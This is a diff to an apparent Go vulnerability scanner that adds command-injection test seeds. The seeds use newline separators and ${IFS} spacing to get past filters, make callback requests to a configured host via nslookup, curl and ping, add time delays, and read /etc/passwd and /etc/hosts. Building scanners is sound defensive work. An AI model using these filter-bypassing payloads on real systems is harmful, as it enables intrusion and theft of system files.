@@ -285,6 +285,14 @@ var commandInjectionSeeds = []string{
 	// The braced spelling of IFS. A filter that strips the `$IFS` the mutation
 	// engine produces has not seen `${IFS}`, and the shell reads both the same.
 	";${IFS}nslookup " + checks.CallbackHost,
+	// A newline where the seeds above put `;`, `|` or `&`, and `${IFS}` where they put a
+	// space: a filter that matches the separators and the space it knows about lets these
+	// through, and the shell runs what follows all the same.
+	"\nnslookup " + checks.CallbackHost,
+	"\nnslookup${IFS}" + checks.CallbackHost,
+	"\ncurl " + checks.CallbackURL,
+	"\ncurl${IFS}" + checks.CallbackURL,
+	"\nping " + checks.CallbackHost,
 }
 
 // commandInjectionTimeSeeds make the shell sleep. They are the fallback for a
@@ -297,6 +305,12 @@ var commandInjectionTimeSeeds = []string{
 	"`sleep 3`",
 	"%0asleep 3",
 	"; ping -c 4 127.0.0.1",
+	// The same pause, separated by a newline and spaced by IFS rather than by a space, for a
+	// filter that rejects the separators it knows and the space it expects a command line to
+	// need. Both were measured: each of them made the target wait three seconds while the
+	// seeds above did not.
+	"\nsleep 3",
+	"\nsleep${IFS}3",
 }
 
 // commandInjectionSleep is the pause the time-based seeds request; a response
@@ -366,6 +380,16 @@ var commandOutputSeeds = []string{
 	"; c\\at /etc/passwd",
 	"; cat$@ /etc/passwd",
 	"; /bin/c$@at /etc/passwd",
+	// The newline as the separator. A filter written against the separators it knows — `;`,
+	// `|`, `&` — and against the space often misses this one, and the shell reads it the
+	// same. Measured on a target that rejects all three and a literal space, and runs these:
+	// the value it was given is decoded before it reaches the shell, so a newline arrives as
+	// a newline and the command after it runs.
+	"\ncat /etc/passwd",
+	"\ncat${IFS}/etc/pass?d",
+	"\ncat</etc/passwd",
+	"\ncat /etc/hosts",
+	"\nid",
 }
 
 // commandOutputSignatures are lines those commands produce and an ordinary page
